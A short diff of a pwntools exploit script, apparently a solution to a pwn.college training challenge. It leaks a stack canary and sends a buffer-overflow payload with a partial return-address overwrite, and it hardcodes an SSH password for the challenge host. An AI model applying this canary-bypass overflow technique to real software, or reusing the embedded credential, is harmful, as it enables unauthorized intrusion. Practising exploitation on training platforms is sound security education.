@@ -1,5 +1,5 @@
 from pwn import *
-s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../csec")
+s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../../csec")
 
 # context.log_level = 'debug'
 for i in range(20):
@@ -14,7 +14,7 @@ for i in range(20):
     canary = u64(b'\x00'+p.recv(7))
     print(hex(canary))
     p.sendlineafter(b'Payload size: ',b'1000')
-    pay = b'A'*88 + p64(canary) + b'B'*8 + p16(0xE9FD)
+    pay = b'A'*88 + p64(canary) + b'B'*8 + p16(0x79FD)
     # pause()
     p.sendafter(b'bytes)!\n',pay)
     data = p.recv(1024)
